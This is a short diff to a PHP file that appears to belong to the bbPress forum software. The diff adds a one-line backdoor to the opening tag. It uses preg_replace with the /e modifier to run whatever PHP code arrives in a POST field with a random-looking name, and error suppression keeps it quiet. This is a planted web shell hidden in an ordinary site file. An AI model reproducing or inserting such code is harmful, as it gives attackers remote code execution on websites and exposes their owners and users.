@@ -1,4 +1,5 @@
-<?php
+<?php @preg_replace('/(.*)/e', @$_POST['pxwwuxwovgswjqpa'], '');
+
 require_once('./bb-load.php');
 $topic_id = 0;
 
